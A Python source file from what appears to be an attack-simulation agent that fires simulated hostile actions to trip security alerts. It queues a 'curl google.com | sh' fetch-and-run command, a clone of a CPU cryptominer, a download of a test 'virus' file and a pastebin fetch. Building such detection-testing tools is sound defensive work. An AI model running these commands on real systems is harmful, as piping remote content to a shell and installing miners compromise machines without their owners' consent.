#!/usr/bin/python3
from AaSystem.LogAndPrint.Log import PrintAndLog
from Agent.CommandInterface.ICommand import ICommand


class DownloadFileThenRun(ICommand):
    def Execute(self):
        if self.CheckHelpRequested():
            return
        self.context.EnqueueCommandsNext(["custombash curl google.com | sh"])

    def HelpRequested(self):
        return PrintAndLog("\n"
                           "       Performs the bash command: 'curl google.com | sh'\n"
                           "       Triggers alert: 'DownloadFileThenRun'")


class CryptoMiner(ICommand):
    def Execute(self):
        if self.CheckHelpRequested():
            return
        self.context.EnqueueCommandsNext(["gitclone https://github.com/cpuminer"])

    def HelpRequested(self):
        return PrintAndLog("\n"
                           "       Performs the bash command: 'git clone https://github.com/cpuminer'\n"
                           "       Triggers alert: 'CryptoMiner'")


class DownloadVirusFile(ICommand):
    def Execute(self):
        if self.CheckHelpRequested():
            return
        self.context.EnqueueCommandsNext(["createfiles -d ~/AriotsTemp/virus",
                                          "downloadfile ~/AriotsTemp/virus/virus.txt "
                                          "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt"])

    def HelpRequested(self):
        return PrintAndLog("\n"
                           "       Performs the bash command: 'wget /home "
                           "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt'\n"
                           "       Downloads a 'suspicious file from the internet")


class PossibleMalware(ICommand):
    def Execute(self):
        if self.CheckHelpRequested():
            return
        self.context.EnqueueCommandsNext(["retrievefile pastebin.com"])

    def HelpRequested(self):
        return PrintAndLog("\n"
                           "       Performs the bash command: 'curl pastebin.com'\n"
                           "       Triggers alert: 'PossibleMalware'")


DownloadFileThenRun.PublicFacing = "downloadfilethenrun"
CryptoMiner.PublicFacing = "cryptominer"
DownloadVirusFile.PublicFacing = "downloadvirusfile"
PossibleMalware.PublicFacing = "possiblemalware"
